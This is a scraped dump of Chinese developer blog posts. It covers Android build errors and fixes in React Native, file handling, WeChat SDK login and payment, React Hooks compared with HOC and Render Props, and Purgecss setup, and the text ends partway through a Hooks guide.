livesdk.aar (com.tencent.livesdk:livesdk:1.1.4) &gt; Could not get resource 'https://jcenter.bintray.com/com/tencent/livesdk/livesdk/1.1.4/livesdk-1.1.4.aar'. &gt; Could not GET 'https://jcenter.bintray.com/com/tencent/livesdk/livesdk/1.1.4/livesdk-1.1.4.aar'. &gt; Read timed out 很常规的错误，就是网络的问题，调整网络（翻墙什么的）重新 react-native run-android。 错误 10（SDK 版本问题）1uses-sdk:minSdkVersion 16 cannot be smaller than version 21 declared in library minSdkVersion 不能少于指定的版本。修改 android/app/build.gradle 1234567891011121314android &#123; compileSdkVersion 23 buildToolsVersion \"23.0.1\" defaultConfig &#123; applicationId \"com.myapp\" minSdkVersion 21 // &lt;--- 这里 targetSdkVersion 22 versionCode 1 versionName \"1.0\" ndk &#123; abiFilters \"armeabi-v7a\", \"x86\" &#125; &#125; 错误 11（网络问题）1234&gt; Could not find any matches for com.android.tools.build:gradle:2.2.+ as no versions of com.android.tools.build:gradle are available. Searched in the following locations: https://jcenter.bintray.com/com/android/tools/build/gradle/maven-metadata.xml https://jcenter.bintray.com/com/android/tools/build/gradle/ gradle 版本不符合要求，然后叫你去看文档，233。 在 \\android\\build.gradle 里尝试修改正确的版本。 1234567891011buildscript &#123; repositories &#123; jcenter() &#125; dependencies &#123; classpath 'com.android.tools.build:gradle:2.2.3' // NOTE: Do not place your application dependencies here; they belong // in the individual module build.gradle files &#125;&#125; 或者是你没有安装对应的编译工具，打开 SDK Manager.exe 下载 Android SDK Build-tools 试试看。 2018-12-11 Google removed version 2.2.0 of their gradle build tools，导致了所有的第三方库，编译失败。 查看这篇文章解决：Android: Fix Missing Gradle 2.2.0 Dependencies 最新解决方案，添加以下代码到 android/build.gradle 里。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748buildscript &#123; ext &#123; compileSdkVersion = 27 buildToolsVersion = '27.0.3' targetSdkVersion = 27 &#125; repositories &#123; jcenter() maven &#123; url \"http://repo.spring.io/plugins-release/\" &#125; &#125; dependencies &#123; classpath 'com.android.tools.build:gradle:3.1.2' &#125;&#125;allprojects &#123; repositories &#123; mavenLocal() maven &#123; url 'https://maven.google.com' name \"google\" &#125; maven &#123; url \"http://repo.spring.io/plugins-release/\" &#125; jcenter() maven &#123; // All of React Native (JS, Obj-C sources, Android binaries) is installed from npm url \"$rootDir/../node_modules/react-native/android\" &#125; &#125;&#125;subprojects &#123; project -&gt; if (project.name.contains('react-native-vector-icons') || project.name.contains('react-native-fast-image') || project.name.contains('react-native-linear-gradient') || project.name.contains('react-native-get-real-path') ) &#123; buildscript &#123; repositories &#123; maven &#123; url \"https://dl.bintray.com/android/android-tools/\" &#125; maven &#123; url \"http://repo.spring.io/plugins-release/\" &#125; &#125; dependencies &#123; classpath \"com.android.tools.build:gradle:3.1.2\" &#125; &#125; &#125;&#125; 错误 12（gradle 问题）react-native 0.5x 在安卓环境 gradle 3.x 版本下编译 release 版本的时候提示编译失败，但是 debug 模式下是没有问题的。 123Could not find com.android.tools.lint:lint-gradle:26.1.1Execution failed for task ':app:processReleaseResources'Execution failed for task ':app:lintVitalRelease' 又是 gradle 的问题。 在 gradle.properties 里添加： 1android.enableAapt2 = false 在 build.gradle 中添加： 1234lintOptions &#123; abortOnError false checkReleaseBuilds false&#125; 错误 13（gradle 问题）12&gt; Failed to apply plugin [id 'com.android.application'] &gt; Minimum supported Gradle version is 3.3. Current version is 2.14.1. If using the gradle wrapper, try editing the distributionUrl 最低的 gradle 版本要求是 3.3，现在的版本是 2.14.1，需要修改版本。 错误 14（tools sdk 问题）12345* What went wrong:A problem occurred configuring project ':app'.&gt; Could not resolve all dependencies for configuration ':app:_debugApk'. &gt; A problem occurred configuring project ':react-native-doc-viewer'. &gt; The SDK Build Tools revision (23.0.1) is too low for project ':react-native-doc-viewer'. Minimum required is 25.0.0 编译工具版本太低了，需要 25.0.0 以上。去源码，那里修改版本。 node_modules\\react-native-doc-viewer 123android &#123; compileSdkVersion 23 buildToolsVersion \"25.0.0\" 错误 15（gradle 问题）打包时出现的错误，开发模式就没错误，而且还是 gradle 升级到 v3+ 后出现的错误。 12error: uncompiled PNG file passed as argument. Must be compiled first into .flat file..error: failed parsing overlays. 在 android/gradle.properties 里添加代码。 1android.enableAapt2=false 错误 16（文件问题）1Home/android/app/build/intermediates/res/merged/release/drawable-xxhdpi-v4/app_images_common_preservation.png: Original is here. The version qualifier may be implied. Gradle 2.3 之后，离线打包的路径都会在 drawable-xxx-v4 中，原版的离线路径在 drawable-xxx 中，所以导致图片重复问题。 修改 node_modules\\react-native\\local-cli\\bundle\\assetPathUtils.js 的代码后成功编译。 12345678910function getAndroidAssetSuffix(scale) &#123; switch (scale) &#123; case 0.75: return 'ldpi-v4'; case 1: return 'mdpi-v4'; case 1.5: return 'hdpi-v4'; case 2: return 'xhdpi-v4'; case 3: return 'xxhdpi-v4'; case 4: return 'xxxhdpi-v4'; &#125;&#125; 错误 17（网络问题）真 TM 烦。依赖问题，好像是网络被墙。 1234&gt; Could not resolve all dependencies for configuration ':app:_debugApk'. &gt; A problem occurred configuring project ':react-native-fs'. &gt; Failed to notify project evaluation listener. &gt; com.android.build.gradle.tasks.factory.AndroidJavaCompile.setDependencyCacheDir(Ljava/io/File;)V 修改成阿里云的 maven。 1maven &#123; url 'http://maven.aliyun.com/nexus/content/groups/public/' &#125; 错误 18（版权问题）这种逼错误真他妈烦，版权问题。 去到 sdk 目录，tools/bin 执行： 12sdkmanager --update// 后面一波 yes 安装 SDK tools 明明勾选了接收接收，现在为什么还报一逼错误？ 错误 19（网络问题）如图，一下依赖被墙了。 解决方法是，添加阿里的镜像：maven { url &#39;http://maven.aliyun.com/nexus/content/groups/public/&#39; }。 12345678910111213141516171819buildscript &#123; repositories &#123; maven &#123; url 'http://maven.aliyun.com/nexus/content/groups/public/' &#125; google() jcenter() &#125; dependencies &#123; classpath 'com.android.tools.build:gradle:3.1.2' &#125;&#125;allprojects &#123; repositories &#123; maven &#123; url 'http://maven.aliyun.com/nexus/content/groups/public/' &#125; google() jcenter() &#125;&#125; 错误 20（gradle 问题）清空本地的 gradle 缓存试试。 1C:\\Users\\Administrator\\.gradle\\caches\\modules-2\\files-2.1\\com.squareup.okhttp3\\okhttp\\3.12.1\\dc6d02e4e68514eff5631963e28ca7742ac69efe\\okhttp-3.12.1.jar: D8: Typ`e `org.conscrypt.Conscrypt` was not found, it is required for default or static interface methods desugaring of `java.security.Provider okhttp3.internal.platform.ConscryptPlatform.getProvider()` 错误 21（缺少文件）很佩服这个错误，原因是作者真是坑爹。 问题是缺少了某些文件，说找不到文件。这里是少了 android\\app\\src\\main\\res\\mipmap-hdpi\\ic_launcher.png 的图标。补上即可。 12&gt; Android resource linking failed G:\\React-Native\\agora-react-native-rtm\\examples\\chatsapp\\android\\app\\build\\intermediates\\merged_manifests\\debug\\AndroidManifest.xml:20: AAPT:fest.xml:20: AAPT: error: resource mipmap/ic_launcher (aka com.chatsapp:mipmap/ic_launcher) not found. 错误 22（协议未授权）这种情况基本在第一次装 Android SDK 时出现，提示是，没有授权相关多协议，更新一下即可。 1error Failed to install the app. Please accept all necessary Android SDK licenses using Android SDK Manager: \"$ANDROID_HOME/tools/bin/sdkmanager --licenses\". Run CLI with --verbose flag for more details. 解决方法是去到 tools/bin 里找 sdkmanager，使用 –update 更新协议。 123cd E:\\Android\\android-sdk\\tools\\bin./sdkmanager --updateyes","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 文件相关操作","slug":"React Native/IO/React Native 文件相关操作","date":"2018-11-26T08:43:41.000Z","updated":"2021-06-15T06:10:52.855Z","comments":true,"path":"/stories/2018/11/React Native/IO/React Native 文件相关操作/","link":"","permalink":"http://me.lizhooh.com/stories/2018/11/React Native/IO/React Native 文件相关操作/","excerpt":"前言在移动端上常见的文件操作，包括：文件选择、文件编辑，文件读写，文件上传，文件查看，文件下载等。在 React Native 这种跨平台上，适合很难做到这么全，但是在已有的库下，我们还能实现文件选择、文件读写、文件上传、文件查看、文件下载等功能，几乎能满足各大业务需求。","text":"前言在移动端上常见的文件操作，包括：文件选择、文件编辑，文件读写，文件上传，文件查看，文件下载等。在 React Native 这种跨平台上，适合很难做到这么全，但是在已有的库下，我们还能实现文件选择、文件读写、文件上传、文件查看、文件下载等功能，几乎能满足各大业务需求。 选择文件选择文件：指的是，在 React Native 里呼出系统的文件系统，选择文件后，获取到一些数据和文件的源地址。一般拿到源地址后，可以进行下一步操作，比如上传等。 选择文件会有很多种需要，但最基本的要求是能选择图片。 选择图片、视频可以使用 react-native-image-crop-picker，这个库，它还附带了图片裁剪等功能。 除了选择图片、视频，可能还会遇到选择音频、office 系列的文件等需求。如果使用 image-crop-picker 是不行的，因为它源码里就规定了只有图片和视频的选择。 这就要使用我 fork 的这个库：react-native-file-chooser，它可以打开手机系统的文件选择界面。 如果要选择音频，则需要这样写： 123456789import &#123; FilePicker &#125; from 'react-native-file-chooser';FilePicker.show(&#123; title: '音频文件', mimeType: 'audio/*',&#125;, async res =&gt; &#123; if (res.didCancel) return; // ...&#125; FilePicker 返回的是一个 uri 的资源地址，一般为了获取文件的后缀，可以使用 react-native-get-real-path 把 uri 转换为真实的文件 path。 12345678let ext = '';try &#123; const path = await getPath.getRealPathFromURI(res.uri) ext = path.replace(/.*\\.(\\w+)$/, '$1');&#125;catch (err) &#123; // ...&#125; 但是基于某些手机的差异性有时候会获取失败，另外 FilePicker 返回的参数里带有 filename，但是在具体的测试发生无论是模拟还是真机，都会出现为 null 的情况。（这时候需要自己做特殊处理） 文件上传axios + FormData 实现文件上传。FormData 是 React Native 内置的一个对象，不需要 import 引入。使用 FormData 的时候，必须指定 uri、type、name 这三个值。 123456789101112131415161718192021const formdata = new FormData();formdata.append('filetype', type);formdata.append('file', &#123; uri: path, type: type, name: name,&#125;);// 文件上传axios.post('https://xxx.com/upload/', formdata, &#123; headers: &#123; 'content-type': 'multipart/form-data', 'device-type': 'android', &#125;, onUploadProgress: e =&gt; &#123; // 上传进度 &#125;,&#125;).then(res =&gt; &#123; // ...&#125;); 文件查看文件查看比较麻烦，因为文件类型比较多，如果是图片、视频、音频、可以直接在 React Native 里查看。查看图片非常简单，播放视频、音频使用 react-native-video 即可，自己做一点进度条什么的就行了。 如果是其他的文档类型，则使用系统的应用程序查看。这时候使用到了一个非常关键的库：react-native-doc-viewer)，它可以呼出系统的应用程序。 123456789101112131415toast.loading('尝试打开文件');OpenFile.openDoc([&#123; url: date.url, fileName: date.filename, cache: true, fileType: date.filename.replace(/.*\\.(.*?$)/, '$1'),&#125;], (error, url) =&gt; &#123; if (error) &#123; toast.error('没有找到合适的打开应用程序'); &#125; else &#123; toast._close(); &#125;&#125;); 点击对应类型文件，会直接连接到默认打开程序，例如打开 office 系列的文件（下面是从 React Native App 端打开 office 系列的文件）。 文件下载文件下载使用 react-native-fs 的 API。首先，需要的是在系统的目录里创建保存下载文件的文件夹。 123456import fs from 'react-native-fs';const ROOTDIR = fs.ExternalStorageDirectoryPath + '/text';// 创建文件夹fs.mkdir(ROOTDIR); 之后，可以安心下载，downloadFile API 提供了下载进度的回调函数，可以利用它做一些下载动画效果。 12345678910111213fs.downloadFile(&#123; fromUrl: url, // 网络地址 toFile: '', // 下载的文件目录，必须预先存在 progress: onProgress, // 进度回调 begin: onBegin, // 开始下载 headers: &#123; 'device-type': 'android' &#125;,&#125;).promise.then(res =&gt; &#123; console.log(res);&#125;).catch(err =&gt; &#123; console.log(err);&#125;);","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"},{"name":"网络请求","slug":"网络请求","permalink":"http://me.lizhooh.com/tags/网络请求/"}]},{"title":"React Native 接入微信 SDK 那些事","slug":"React Native/React Native 接入微信 SDK 那些事","date":"2018-11-13T12:22:39.000Z","updated":"2021-06-15T06:10:52.863Z","comments":true,"path":"/stories/2018/11/React Native/React Native 接入微信 SDK 那些事/","link":"","permalink":"http://me.lizhooh.com/stories/2018/11/React Native/React Native 接入微信 SDK 那些事/","excerpt":"前言本文记录的是使用 React Native 开发 App 时，接入微信 SDK 的过程，包括了微信支付，微信分享，微信登录等。 接入流程接入流程看这篇文章：react-native-wechat （react-native 微信分享、支付) 好了，主要是使用到了 react-native-wechat 这个库。","text":"前言本文记录的是使用 React Native 开发 App 时，接入微信 SDK 的过程，包括了微信支付，微信分享，微信登录等。 接入流程接入流程看这篇文章：react-native-wechat （react-native 微信分享、支付) 好了，主要是使用到了 react-native-wechat 这个库。 总的来说，如果是微信分享，则需要 Appid。如果是微信登录，则需要 Appid，AppSecret。如果是微信支付，则需要 Appid，AppSecret，商家号。 微信授权登录微信授权登录的接入需要用到：AppId 以及 AppSecret。 接入微信授权登录大致的思路是：在后端存储好获取的 openid，在 App 授权之后可以拿到 openid，与后端进行匹配，如果对上了就认为授权了，可以无需密码登录。 在 App 会经历以下的过程： 1 唤起微信，这时会有一个确定的按钮点击，点击之后可以拿到一些数据。 2 根据 code 和 AppSecret 获取 openid，在获取 openid 之后就可以与后端交互了。 具体流程看文档吧，写得很详细了：移动应用微信登录开发指南 获取用户信息的文档：授权后接口调用（UnionID） 在 React Native 上的代码实现如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import * as WeChat from 'react-native-wechat';import &#123; ToastAndroid as Toast &#125; from 'react-native';import qs from 'qs';// 微信授权登录export const wxAuthLogin = async () =&gt; &#123; const scope = 'snsapi_userinfo'; const state = Math.random().toString(32).slice(2); try &#123; let res = await WeChat.sendAuthRequest(scope, state); let url = 'https://api.weixin.qq.com/sns/oauth2/access_token?' + qs.stringify(&#123; appid: '', // 你的 appid secret: '', // 你的 AppSecret code: res.code, // 注意这里一定要是 authorization_code grant_type: 'authorization_code', &#125;); res = await fetch(url); // 拿到了 openid 了 if (res.openid &amp;&amp; res.access_token) &#123; // 接着获取用户的信息 url = 'https://api.weixin.qq.com/sns/userinfo?' + qs.stringify(&#123; access_token: res.access_token, openid: res.openid, &#125;); res = await fetch(url).then(res =&gt; res.json()); // 已经拿到了 openid 和用户的基本信息了，这时把数据提交给后端完事 console.log(res); return res; &#125; else &#123; Toast.show('微信授权登录失败'); &#125; &#125; catch (err) &#123; if (err.code === -2) &#123; Toast.show('用户取消微信登录授权', Toast.SHORT); &#125; if (err.code === -4) &#123; Toast.show('用户拒绝微信登录授权', Toast.SHORT); &#125; console.error(err); &#125;&#125; 最后得到的数据。 微信支付微信支付的接入需要用到：AppId 以及 商家号。 在接入之前需要后端写好通信的接口，具体的流程是这样的： 1 用户在 App 中选择商品，提交订单，选择微信支付。（前端） 2 商户后台收到用户支付单，调用微信支付统一下单接口。（后端） 3 统一下单接口返回正常的 prepay_id，再按签名规范重新生成签名后，将数据传输给 App。参与签名的字段名为 appid，partnerid，prepayid，noncestr，timestamp，package。注意：package 的值格式为 Sign=WXPay。（后端） 4 商户 App 调起微信支付。（前端） 5 商户后台接收支付通知。（后端） 6 商户后台查询支付结果。（后端） 相关文档看这里：微信支付 - APP 支付开发者文档。 在 React Native 上的代码实现如下： 123456789101112131415161718192021222324252627282930// 请求后端获取必要的数据fetch('http://127.0.0.1:3000/wechat/pay').then(res =&gt; res.json()).then(res =&gt; &#123; res = &#123; partnerId: '', // 商家向财付通申请的商家 id prepayId: '', // 预支付订单 nonceStr: '', // 随机串，防重发 timeStamp: '', // 时间戳，防重发 package: '', // 商家根据财付通文档填写的数据和签名 sign: '' // 商家根据微信开放平台文档对数据做的签名 &#125; // 这里是唤起微信支付 WeChat.pay(res).then(res =&gt; &#123; // 到了这里就是用户点击支付之后，拿到的数据 console.log(res); // &#123; // returnKey: \"\", // type: 'PayReq.Resp', // transaction: null, // openId: null, // errStr: null, // errCode: 0, // &#125; // 可以在请求后端，确认信息，接着显示支付成功页面 if (res.errCode === 0) &#123; Toast.show('微信支付成功', Toast.SHORT); &#125; &#125;);&#125;); 签名与调试接入了微信 SDK 之后因为签名的问题，因此还需要把开发模式下的签名统一与发布的签名一样，不然每次调试都要发布一次。 在 android/app/build.gradle 里添加统一签名。 123456789101112131415161718signingConfigs &#123; release &#123; if (project.hasProperty('MYAPP_RELEASE_STORE_FILE')) &#123; storeFile file(MYAPP_RELEASE_STORE_FILE) storePassword MYAPP_RELEASE_STORE_PASSWORD keyAlias MYAPP_RELEASE_KEY_ALIAS keyPassword MYAPP_RELEASE_KEY_PASSWORD &#125; &#125; debug &#123; if (project.hasProperty('MYAPP_RELEASE_STORE_FILE')) &#123; storeFile file(MYAPP_RELEASE_STORE_FILE) storePassword MYAPP_RELEASE_STORE_PASSWORD keyAlias MYAPP_RELEASE_KEY_ALIAS keyPassword MYAPP_RELEASE_KEY_PASSWORD &#125; &#125;&#125; 而 MYAPP_RELEASE_xxx 是写在了 gradle.properties 里，例如： 1234MYAPP_RELEASE_STORE_FILE=../keystores/xxx.keystore // 签名文件MYAPP_RELEASE_KEY_ALIAS=xxx // 别名MYAPP_RELEASE_STORE_PASSWORD=xxx // 签名密码MYAPP_RELEASE_KEY_PASSWORD=xxx // 别名密码 好了，后面编译后就可以在 debug 版本下调试微信 SDK 了。 下一节：React Native 接入支付宝 SDK 那些事。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"从 HOC、Render Props 到 Hooks 的演变","slug":"React/Hooks/从 HOC、Render Props 到 Hooks 的演变","date":"2018-11-10T03:00:03.000Z","updated":"2021-06-15T06:10:52.873Z","comments":true,"path":"/stories/2018/11/React/Hooks/从 HOC、Render Props 到 Hooks 的演变/","link":"","permalink":"http://me.lizhooh.com/stories/2018/11/React/Hooks/从 HOC、Render Props 到 Hooks 的演变/","excerpt":"前言对 React 开发比较深入的都知道在 React 里有 HOC 和 Render Props 两个模式。这两种模式各有各的特点，一般在制作一些类似于 Model 的组件时，会考虑使用 HOC 的方式，一般在制作布局组件时会考虑使用 Render Props 的方式。 而在 React v16.7 之后似乎打破了这两个方式的平衡，主要是推出了一种 Hooks 的模式，可以取代 HOC 和 Render Props。","text":"前言对 React 开发比较深入的都知道在 React 里有 HOC 和 Render Props 两个模式。这两种模式各有各的特点，一般在制作一些类似于 Model 的组件时，会考虑使用 HOC 的方式，一般在制作布局组件时会考虑使用 Render Props 的方式。 而在 React v16.7 之后似乎打破了这两个方式的平衡，主要是推出了一种 Hooks 的模式，可以取代 HOC 和 Render Props。 什么是 HOC？HOC 又叫高阶组件（柯里化），在 react-redux 里 connect 就是一个高阶组件。 HOC 它有以下的用途： 属性代理。 注入 props。 操作 props/state。 获得 refs 的引用。 抽象 state。 用其他元素包裹组件。 反向继承。 渲染劫持。 123connect( state =&gt; (&#123; home: state.home &#125;),)(App); HOC 通常的结构是参数接收注入某个组件的参数，返回一个接入注入参数的组件，从而实现一种代理的方式。 例如使用 HOC 的模式，编写的 AsyncComponent 组件，用于懒加载方式异步加载组件。 1234567891011121314151617181920import React, &#123; Component &#125; from 'react';const AsyncComponent = (loadComponent) =&gt; (class extends Component &#123; state = &#123; Component: null &#125; // 异步加载 componentWillMount() &#123; if (this.state.Component !== null) return; loadComponent() .then(module =&gt; module.default) .then((Component) =&gt; this.setState(&#123; Component &#125;)); &#125; render() &#123; const &#123; Component &#125; = this.state; return (Component) ? &lt;Component &#123;...this.props&#125; /&gt; : null; &#125;&#125;); AsyncComponent 接收一个组件，在组件加载完成后显示它，这也是 HOC 的一种方式。并且是 HOC 的一种特点：渲染劫持，在组件未加载完成前拦截为 null。 什么是 Render Props？Render Props 顾名思义就是组件的内容从 Props 里获取，一般支持 Render Props 都是一些布局组件或者是包裹组件，其标记就是 props 的名称大多使用 render 开头，其属性值为渲染的函数。 在 React Native 里有许多都是支持 Render Props 的组件，例如 ListView 有 renderHeader、renderFooter 等属性。 来看看下面的一个典型的 Render Props 示例。 1234567891011121314151617181920212223import &#123; Query &#125; from 'react-apollo';import gql from 'graphql-tag';const ExchangeRates = () =&gt; ( &lt;Query query=&#123;gql`&#123; rates(currency: \"USD\") &#123; currency, rate &#125; &#125;`&#125;&gt; &#123;(&#123; loading, error, data &#125;) =&gt; &#123; if (loading) return &lt;p&gt;Loading...&lt;/p&gt;; if (error) return &lt;p&gt;Error :(&lt;/p&gt;; return data.rates.map((&#123; currency, rate &#125;) =&gt; ( &lt;div key=&#123;currency&#125;&gt; &lt;p&gt;&#123;`$&#123;currency&#125;: $&#123;rate&#125;`&#125;&lt;/p&gt; &lt;/div&gt; )); &#125;&#125; &lt;/Query&gt;); 这个示例也是 Render Props 模式，因为在 React 里 children 也是 props，而且是一个默认的 props。 使用 HooksHooks 是 React v16.7 之后的一个新的提案，具体看：React 新特性：Hooks 使用指南 继续上面的 Render Props 示例，把它改造成 Hooks 就是这样。 12345678910111213141516const ExchangeRates = () =&gt; &#123; const [&#123; loading, error, data &#125;] = useQuery(gql`&#123; rates(currency: \"USD\") &#123; currency, rate &#125; &#125;`); if (loading) return &lt;p&gt;Loading...&lt;/p&gt;; if (error) return &lt;p&gt;Error :(&lt;/p&gt;; return data.rates.map((&#123; currency, rate &#125;) =&gt; ( &lt;div key=&#123;currency&#125;&gt; &lt;p&gt;&#123;`$&#123;currency&#125;: $&#123;rate&#125;`&#125;&lt;/p&gt; &lt;/div&gt; ));&#125;; 上面的 AsyncComponent HOC 示例，把它改造成 Hooks 就是这样。 1234567891011const AsyncComponent (loadComponent) =&gt; (props) =&gt; &#123; const [component, setComponent] = useState(null); useEffect(() =&gt; &#123; loadComponent() .then(module =&gt; module.default) .then(c =&gt; setComponent(c)) &#125;, [component]); return component ? &lt;component &#123;...props&#125; /&gt; : null;&#125; 小结在现有的 Hooks 阶段，是完全有能力取代 HOC、Render Props 的方式的，并且代码量少了很多，在结构上也会非常的清晰。 因此，建议在新的项目或组件开发里，尽量使用 Hooks，拥抱 React 函数式编程。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"💅 Purgecss 可以自动去除未使用的 CSS 代码","slug":"React/Style/Purgecss 可以自动去除未使用的 CSS 代码","date":"2018-11-09T02:59:10.000Z","updated":"2021-06-15T06:10:52.885Z","comments":true,"path":"/stories/2018/11/React/Style/Purgecss 可以自动去除未使用的 CSS 代码/","link":"","permalink":"http://me.lizhooh.com/stories/2018/11/React/Style/Purgecss 可以自动去除未使用的 CSS 代码/","excerpt":"前言Purgecss 是一个可以自动去除未使用多余的 css 代码，当前全局的样式代码它不会去除。 你可以使用 purgecss 进一步的减少你的样式代码，在使用一些 UI 库时非常重要。","text":"前言Purgecss 是一个可以自动去除未使用多余的 css 代码，当前全局的样式代码它不会去除。 你可以使用 purgecss 进一步的减少你的样式代码，在使用一些 UI 库时非常重要。 配置在 create-react-app 创建的项目里配置，首先安装 react-app-rewired 和相关依赖。 1npm install --dev react-app-rewired purgecss-webpack-plugin glob-all 创建 config-overrides.js 文件： 1234567891011121314const PurgecssPlugin = require('purgecss-webpack-plugin');const glob = require('glob-all');module.exports = function override(config, env) &#123; const purgecssPlugin = new PurgecssPlugin(&#123; paths: ['./public/index.html', ...glob.sync('./src/*')], &#125;); if (env !== 'development') &#123; config.plugins = [...config.plugins, purgecssPlugin]; &#125; return config;&#125;; 修改 package.json 里的 script： 123456\"scripts\": &#123; \"start\": \"react-app-rewired start\", \"build\": \"react-app-rewired build\", \"test\": \"react-app-rewired test\", \"eject\": \"react-app-rewired eject\"&#125;, 完成，编译之后会 purgecss 会自动帮你去除多余的 css 代码。 参考资料 https://www.purgecss.com/","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React 新特性：Hooks 使用指南","slug":"React/Hooks/React 新特性：Hooks 使用指南","date":"2018-11-05T13:58:23.000Z","updated":"2021-06-15T06:10:52.872Z","comments":true,"path":"/stories/2018/11/React/Hooks/React 新特性：Hooks 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2018/11/React/Hooks/React 新特性：Hooks 使用指南/","excerpt":"前言React 的更新还在继续，从今年进入 v16 版本以来，现在已经到了 v16.7 了，在 v16 版本里出现了非常多的革命性突破，比如新的异步渲染引擎，新的组件生命周期，新的组件渲染方式等，更是在 v16.7 里提出了一种钩子概念，名为 Hooks。 目前在 react v16.8.0 上可以完全的使用了 react hooks 了。","text":"前言React 的更新还在继续，从今年进入 v16 版本以来，现在已经到了 v16.7 了，在 v16 版本里出现了非常多的革命性突破，比如新的异步渲染引擎，新的组件生命周期，新的组件渲染方式等，更是在 v16.7 里提出了一种钩子概念，名为 Hooks。 目前在 react v16.8.0 上可以完全的使用了 react hooks 了。 什么是 HooksHooks 是一种函数，该函数允许你“勾住（hook into）”React 状态和来自函数组件的生命周期功能。Hook 在类内部不起作用，它们允许你无需类就使用 React。（不建议你马上开始重写你现有的组件，但你可以在新组件中开始使用 Hook。） React 提供了一些内置 Hook，如 useState，你也可以创建自定义 Hooks 以在不同的组件中复用有状态行为。 根据 React 官方给出的文档，Hooks 主要分为以下几种： State Hooks Effect Hooks 自定义 Hooks 下面是有个官方的例子： 1234567891011121314151617import &#123; useState &#125; from 'react';// useState 就是一个 Hooks（钩子）function Example() &#123; // useState 接收的是初始值，返回一个数组，包含 state 和 更新 state 的函数。 // 在第一次渲染时使用初始值，之后就是内存值 const [count, setCount] = useState(0); return ( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; );&#125; 在这里，useState 是一个 Hook，我们在函数组件中调用它以给它添加一些本地状态。React 将在重新渲染之会间保留这个状态（请不要被这段代码骗了）。useState 返回一对值：currentstate 值和允许你更新它的函数。 可以从事件处理程序或其他位置调用该函数，这与类中的 this.setState 类似，除了其不会把旧的和新的状态合并在一起。 这里有一个疑问：useState 是如何保留之前的状态的，这篇文章可以帮助你 react-hooks-not-magic-just-arrays 在函数组件里，可以使用多个 Hooks。 123456function ExampleWithManyStates() &#123; // 初始值可以是，任意 javascript 类型。 const [age, setAge] = useState(42); const [fruit, setFruit] = useState('banana'); const [todos, setTodos] = useState([&#123; text: 'Learn Hooks' &#125;]);&#125; useState 通过自建 id 来保证数据的正确性，因此，就算初始值一样，返回的值都是不同的内存。 12const [age, setAge] = useState(0);const [count, setCount] = useState(0); age, setAge 是对返回的数组进行解构，名称是随意定义的，一般，我们会取 xxx 和 setXxx 的命名，也可以叫 xxx 和 updateXxx。 Effect Hook如果在 React 里操作 DOM，那么这就是一个副作用的玩法。因为它们会影响其他组件，并且在渲染过程中无法完成。 Effect Hook、useEffect，增加了从函数组件执行副作用的功能。它与 React 类中的 componentDidMount、componentDidUpdate、和 componentWillUnmount 有相同的功能，但是统一为单个 API。 例如，此组件在 React 更新 DOM 后设置文档标题： 12345678910111213141516171819import &#123; useState, useEffect &#125; from 'react';function Example() &#123; const [count, setCount] = useState(0); // componentDidMount and componentDidUpdate: useEffect(() =&gt; &#123; document.title = `You clicked $&#123;count&#125; times`; &#125;); return ( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; );&#125; 这段代码等效于： 1234567891011121314151617181920212223class Example extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; count: 0 &#125;; &#125; componentDidMount() &#123; document.title = `You clicked $&#123;this.state.count&#125; times`; &#125; componentDidUpdate() &#123; document.title = `You clicked $&#123;this.state.count&#125; times`; &#125; render() &#123; return ( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;() =&gt; this.setState(&#123; count: this.state.count + 1&#125;)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; ); &#125;&#125; Effect 在组件内声明，因此可以访问其 props 和 state。默认情况下，React 在每次渲染后运行 effect，包括第一次渲染。 Effect 还可以通过返回一个函数来指定它们之后如何清理。例如，此组件使用 effect 来订阅朋友的在线状态，并通过取消订阅来清理。 12345678910111213const _timer = null;function Status() &#123; useEffect(() =&gt; &#123; _timer = setInterval(() =&gt; &#123; // ... &#125;, 1000 * 1); return () =&gt; &#123; clearInterval(this._timer); &#125; 